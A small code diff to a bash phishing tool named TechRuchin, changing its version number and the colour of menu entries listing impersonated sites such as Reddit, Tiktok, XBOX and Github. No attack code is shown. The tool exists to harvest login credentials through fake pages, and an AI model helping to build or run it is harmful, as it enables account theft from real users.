@@ -2,7 +2,7 @@
 
 ##   TechRuchin 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.1
+##   Version 	: 	1.1
 ##   Github 	: 	https://github.com/RuchinHimasha
 
 ##   THANKS TO :
@@ -532,7 +532,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${BLUE} Custom1        ${RED}[${WHITE}35${RED}]${BLUE} Custom2        ${RED}[${WHITE}36${RED}]${BLUE} Custom3
+		${RED}[${WHITE}34${RED}]${ORANGE} Custom1       ${RED}[${WHITE}35${RED}]${ORANGE} Custom2      ${RED}[${WHITE}36${RED}]${ORANGE} Custom3
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
